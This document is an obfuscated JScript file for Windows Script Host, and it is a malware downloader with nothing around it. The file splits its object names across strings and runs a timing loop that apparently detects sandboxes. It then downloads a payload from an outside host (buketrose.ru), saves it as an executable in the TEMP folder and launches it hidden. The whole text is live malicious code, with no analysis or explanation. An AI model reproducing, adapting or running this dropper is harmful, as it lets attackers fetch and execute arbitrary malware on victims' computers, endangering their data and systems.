var E = false;
var YD = "Create"+"Object";
var T = function UP() {return WScript[YD]("WScript"+".Shell");}(), O = 11;
var RZ = "MSXML2"+".XMLHTTP";
var JB = 2;
var J = JB - 2;
function N(A0){T["Run"](A0, J, J);};
function RH(){return RZ + "";};
function DC(Y, P){J = J * 1; return Y - P;};
function B(){return YD;};
/*@cc_on
  @if (@_win32 || @_win64)
    E = true;
  @end
@*/
if (E)
{
var K = "";
function A(){return 22;};
var F0 = 0; var C0 = 0;
function TY()
{
var F = new this["Date"]();
var I = F["getUTCMilliseconds"]();
WScript["Sleep"](A());
var F = new this["Date"]();
var PR = F["getUTCMilliseconds"]();
WScript["Sleep"](A());
var F = new this["Date"]();
var C = F["getUTCMilliseconds"]();
var F0 = "RJ";
F0 = DC(PR, I);
var C0 = "N0";
C0 = DC(C, PR);
K = "open";
return DC(F0, C0);
}
var WZ = false;
var W = false;
for (var OO = J; OO < A() * 1; OO++){if (TY() != J){
WZ = true; 
C0 = "31" + 11 * F0 + C0; 
W = true; 
break;
}}
function CH() {return ((WZ == true) && (WZ == W)) ? 1 : J;};
if (WZ && CH() && W){
function MH() {return T["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "xQKWZ5Gb.ex" + "e";};
 V0 = RH();
 V = WScript[YD](V0);
 var KJ = 1;
do { 
	for (;KJ;){
	try {
		if (KJ == 1)
		{
			V[K]("GET", "http://buketrose.ru/h3sia", false);
			V["send"]();
			YD0 = "Sleep";
			KJ = 2;
		}
		WScript[YD0](A() + 120); 
		if (V["readystate"] < 2 * 2) continue;
		KJ = J;
		function ML(NQ) {var NC = (1, 2, 3, 4, 5, NQ); return NC;};
		F1 = WScript[B()]("ADODB.Stream");
		V0 = F1;
		V0[K]();
		V0["type"] = ML(1);
		V0["write"](V["ResponseBody"]);
		F1["position"] = ML(J);
		V0["Save" + "ToFile"](MH(), 2);
		F1["cl"+"ose"]();
		VM = MH();
		N(VM);
	} catch(QP){};};
}while (KJ);
}
}

